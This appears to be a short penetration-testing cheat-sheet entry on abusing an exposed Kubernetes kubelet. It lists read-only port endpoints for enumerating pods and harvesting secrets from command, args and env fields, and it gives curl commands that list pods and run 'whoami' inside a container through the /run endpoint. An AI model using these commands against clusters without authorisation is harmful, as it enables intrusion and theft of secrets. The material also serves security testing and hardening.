Kubelet is the primary “node agent” that runs on each node and is used to register the nodes in the Kubernetes cluster through the API server. After a successful registration, the primary role of kubelet is to deploy pods and monitor the kube API for changes to its pod assignments. 

When the “kubelet” read-only port is exposed, at attacker can retrieve information from the API. This exposes **cluster configuration elements, such as pods names, location of internal files and other configurations**. 

For /pods, look for secrets in the “command”, “args”, and “env” keys

- `http://node:10255/pods`
- `http://node:10255/stats/summary`
- `http://node:10255/metrics`

Other endpoints of interest. These are disabled if debug endpoints are disabled:

- `http://node:10255/run/`
- `http://node:10255/exec/`
- `http://node:10255/logs/`

### Get pods in kubelet

```bash
curl -sk http://<node_ip>:10255/pods/|jq '.items|.[] | {namespace: .metadata.namespace, name: .metadata.name}
```

### Run Command

```bash
curl -sk https://<node_ip>:10250/run/<namespace>/<pod>/<container>/ -d "cmd=whoami"
```